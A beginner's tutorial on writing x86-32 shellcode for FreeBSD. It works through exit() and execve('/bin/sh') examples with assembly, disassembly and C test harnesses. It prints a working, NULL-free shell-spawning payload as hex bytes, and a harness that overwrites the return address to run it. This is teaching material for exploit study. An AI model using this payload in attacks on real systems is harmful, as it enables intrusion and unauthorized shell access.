#### Beginners Guide To x86 Shellcoding on FreeBSD  
A guide by Xwyzard on writing x86-32 shellcode on FreeBSD

  
**Introduction**

The purpose of this tutorial is to help familiarize you with creating shellcode on the FreeBSD operating system. While I endeavor to explain everything in here thoroughly, this paper is not meant to be a primer on assembly coding. In the disassemblies you will notice that the assembly code is in AT&T syntax, while I much prefer to use Intel syntax (which is what nasm works on anyway). If you are concerned about the difference please do use google to find those differences. Please do note that I am just a beginner with shellcoding and that this is not meant, in any way, to be the end all, on the contrary this is meant to be an easy introduction for brand new shellcoders. In other words if you have written shellcodes, this is probably not going to interest you. The code within was adapted from linux code examples in The Shellcoders Handbook

**Resources I used:**

- Unix Systems Programming  http://vip.cs.utsa.edu/usp/  
- The Shellcoders Handbook  http://www.wiley.com/WileyCDA/WileyAncillary/productCd-0764544683,typeCd-NOTE.html  
- FreeBSD Assembly Language Programming by G. Adam Stanislav  http://www.int80h.org/bsdasm/  
  
  
**Required tools:**  
  
- objdump  
- NASM (Netwide Assembler)  
- GCC  
- gdb  
  
  
Before we get started, lets save some time and grab a copy of /usr/src/sys/kern/syscalls.master This is the list of syscalls and their related numeric value. It is handy to keep a copy in your coding directory to save time on going to it, besides if you accidentally open that up and make changes while logged in as root, bad things could happen. Let's play it safe and grab a copy. 

Now that we've gotten that out of the way let's dive right in and I'll explain things as we move along. The first shellcode we will do is an extremely simple one, it is for exit(). We start by creating the exit() in C code, this will allow us to analyze the disassembly so that we can rewrite it into asm. Compile this up: gcc -o myexit myexit.c  
  

    /* As easy as it gets */  
    #include
    main()
    {
    exit(0); // exit with "0" for successful exit
    }

Now that we have the compiled code we want to have a peek at the internals using gdb. This will allow us to see the computers "opinion" on what our code looks like in assembly. Just do the steps as I state them: 

    bash$ gdb myexit
    (gdb) disas main
    Dump of assembler code for function main:
    0x80481d8
    : push %ebp
    0x80481d9 : mov %esp,%ebp
    0x80481db : sub $0x8,%esp
    0x80481de : add $0xfffffff4,%esp
    0x80481e1 : push $0x0
    0x80481e3 : call 0x80498dc 
    0x80481e8 : add $0x10,%esp
    0x80481eb : nop
    0x80481ec : leave
    0x80481ed : ret
    End of assembler dump.

Let's break this down piece by piece. First, go ahead and don't worry about anything up to and including Also, don't be concerned about the addresses as mine are most likely going to be different than yours. Now look at , this is the first important part for our uses. That is the one and only parameter passed to exit(). Next is the actual call to exit. Those are the two main things we need from that. Before we get into the code, lets check syscalls.master for the value of sys_exit() 'grep'ping the file we find this line: 1 STD NOHIDE { void sys_exit(int rval); } exit sys_exit_args void The important information from that is 1 which is the syscall number value and the rval (return value) argument. This shows that sys_exit() takes one argument and we should know that a return value of '0' is a successful exit.

Ok, on to putting it into assembly code.


    section .text
    global _start
    _start:
    
    xor eax, eax
    push eax
    push eax
    mov eax, 1
    int 80h

Take a look at the above code, now before we get into it much further a short explanation on why the code is done this way is in order. In FreeBSD (or NetBSD, OpenBSD) the parameters to a syscall are pushed onto the stack in reverse order, the actual syscall number placed into eax and then interrupt 80 to call the kernel to perform the work we setup. 

Now to begin, we have 'xor eax, eax' what this does is zero's out eax in the case there were any values into it alread. Then we 'push eax' twice. (I don't know the technical reasons, but if zero is pushed onto the stack once, the exit call will return 1, we don't want this, just push the zero value twice and save headaches.) Now we load up eax with the syscall value for exit which is 1. Last thing we must do is to actually call the kernel with 'int 80h' 

Great! Now we have something from which we can get shellcode! (Yes I know, finally!)

Alright well we need to assemble and then link this file.

    bash$ nasm -f elf myexit.asm
    bash$ ld -s -o myexit myexit.o

Now that it is assembled and linked we use objdump to get the shellcode from.

    bash$ objdump -d myexit
    shortexit: file format elf32-i386
    /usr/libexec/elf/objdump: shortexit: no symbols
    Disassembly of section .text:
    08048080 <.text>:
    8048080: 31 c0 xor %eax,%eax
    8048082: 50 push %eax
    8048083: 50 push %eax
    8048084: b8 01 00 00 00 mov $0x1,%eax
    8048089: cd 80 int $0x80

Looks beautiful doesn't it? It might to someone, but it's awful for us. Look at those NULLs in there (00), we can't use that it will break as soon as we try to execute it in our C program. In C and in other languages, NULL will terminate a string. This means we are stuck like chuck if we try to load that into a C array. Well we can't have that. There may be other ways to lean out this asm code, but I came up with this one. 

    Section .text
    global _start
    _start:
    
    xor eax, eax
    push eax
    push eax
    inc eax
    int 80h

The only thing different here is the 'inc eax' this increments eax by 1 (remember eax started out at zero and we need 1 (exit syscall value) in it, so in this case it is identical to 'mov eax, 1'.

Again, assemble and link this as shown on the last example and then use objdump.

    bash$ objdump -d myexit
    
    /usr/libexec/elf/objdump: exit_shellcode: no symbols
    Disassembly of section .text:
    
    08048080 <.text>:
    8048080: 31 c0 xor %eax,%eax
    8048082: 50 push %eax
    8048083: 50 push %eax
    8048084: 40 inc %eax
    8048085: cd 80 int $0x80

Look at that! No NULLs in it, that's a good one and we are going to keep it!
Well now we have the proper shellcode with no NULLs in it, it is now time to load it up into a C program to execute it.

    #include 
    #include 
    /*working shellcode */
    char shellcode[] = "\x31\xc0\x50\x50\x40\xcd\x80";
    int main()
    {
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
    }

That's it, looks really pretty too! Now to compile that:

    bash$ gcc -o shellcode shellcode.c
    bash$ ./shellcode ; echo $?
    0

Since we couldn't really see much with an exit, we did 'echo $?'. '$?' is a bash builtin variable that holds the last exit code of a program. Since we gave exit '0' return value we see our code worked! Good job, your patience and work has finally paid off. That was just the beginning though and you would not likely have a use for this code.

Well as you may have guessed, shellcode that exits isn't very interesting or useful, however it is nice and easy to show the major points of creating shellcode. Now is where we get into one of the more common shellcodes and that is to utilize execve() to spawn a shell. But what else could we do with execve()? Tons, but that doesn't matter right now. Before we go anywhere with this though, we should consult syscalls.master so we know exactly what execve() expects. Since execve is not at the very beginning of the file this is how I found it.

    bash$ grep -i 'execve' syscalls.master
    59 STD POSIX { int execve(char *fname, char **argv, char **envv); }

Now since we are going to be calling execve with no arguments, we only need to know what the first argument is. This is a pointer
to the command we wish to execute. We will still need to keep the other arguments in mind since execve still expects to see them.
So we put this call into C code so we have something with which to figure out the assembly code for it.

    #include 
    int main()
    {
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = 0x0;
    execve(name[0], name, 0x0);
    }

Now compile that as we have shown and then fire up gdb:

    bash$ gdb shell
    (gdb) disas main
    Dump of assembler code for function main:
    0x80484a0
    : push %ebp
    0x80484a1 : mov %esp,%ebp
    0x80484a3 : sub $0x18,%esp
    0x80484a6 : movl $0x8048503,0xfffffff8(%ebp)
    0x80484ad : movl $0x0,0xfffffffc(%ebp)
    0x80484b4 : add $0xfffffffc,%esp
    0x80484b7 : push $0x0
    0x80484b9 : lea 0xfffffff8(%ebp),%eax
    0x80484bc : push %eax
    0x80484bd : mov 0xfffffff8(%ebp),%eax
    0x80484c0 : push %eax
    0x80484c1 : call 0x8048350 
    0x80484c6 : add $0x10,%esp
    0x80484c9 : leave
    0x80484ca : ret
    0x80484cb : nop
    End of assembler dump.

Wow that is alot to look at! 

Since this one is so much longer, I will just skip to the code itself as the explanation should be clearer when you see the code. This is also why I am putting the explanation in the comments of this code.

    ;don't worry why this is here other than that it is required
    ;by ld. Just put it in there.
    section .text
    global _start
    _start:
    ;We do this so that we can get the address of db '/bin/sh' onto the stack
    jmp short _callshell
    _shellcode:
    ;This gets us the address of db '/bin/sh' into esi
    pop esi
    ;ensure there are no values in eax
    xor eax, eax
    ;now that eax is NULL, we will take a byte and put it to the end
    ;of the '/bin/sh' string to terminate it.
    mov byte [esi + 7], al
    ;in freebsd assembly we put all the parameters onto the stack
    ;in reverse order. We are pushing eax twice which is null since we
    ;are not using execve() with parameters. However, this is still required
    ;by execve().
    push eax
    push eax
    ;last parameter for execve (note this is actually the first one required
    ;but this is reverse order.)
    push esi
    ;Here's the actual syscall value for execve() we are moving it into
    ;al. If we were to put that value into eax we would get NULLs into
    ;our shellcode which is bad.
    mov al, 0x3b 
    ;don't ask me why this is here, but it is required to have working shellcode
    push eax 
    ;This is what will actually get the kernel involved and perform
    ;the work we have prepared for it above. note that this is interrupt 80h
    int 0x80
    _callshell:
    ;this takes us back up to the main portion of our code. The reason for
    ;this detour has been stated above for relative addresses.
    call _shellcode
    ;our actual command string that will be fed into execve()
    db '/bin/sh'

Now we assemble that file as so:

    bash$ nasm -f elf mynewshell.asm
    bash$ ld -o mynewshell mynewshell.o

Then we fire up objdump:

    bash$ objdump -d mynewshell
    mynewshell: file format elf32-i386
    Disassembly of section .text:
    08048080 <_start>:
    8048080: eb 0e jmp 8048090 <_callshell>
    
    08048082 <_shellcode>:
    8048082: 5e pop %esi
    8048083: 31 c0 xor %eax,%eax
    8048085: 88 46 07 mov %al,0x7(%esi)
    8048088: 50 push %eax
    8048089: 50 push %eax
    804808a: 56 push %esi
    804808b: b0 3b mov $0x3b,%al
    804808d: 50 push %eax
    804808e: cd 80 int $0x80
    08048090 <_callshell>:
    8048090: e8 ed ff ff ff call 8048082 <_shellcode>
    8048095: 2f das
    8048096: 62 69 6e bound %ebp,0x6e(%ecx)
    8048099: 2f das
    804809a: 73 68 jae 8048104 <_callshell+0x74>

Have a look at all that beautiful shellcode. Now the tedious job of putting it into a usable format and right into a C program so that we can actually execute it.

    #include 
    #include 
    /*working shellcode */
    char shellcode[] = "\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56\xb0\x3b"
    "\x50\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
    int main()
    {
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
    }

Compile it:

    bash$ gcc -o shell shell.c
    bash$ ./shell
    $

It worked! We have made shellcode that spawns a shell. That took awhile to get to and while this is certainly not the end to what you can do with shell code, it should give you the confidence to read the other, more thorough, tutorials out there and begin messing with shellcode on your own. 

Special thanks to mardukk/push[eax] and int16h for their assistance on the more technical aspects that I was unsure of and to PrincesSoha for taking the time to edit and format my work far better than I could.
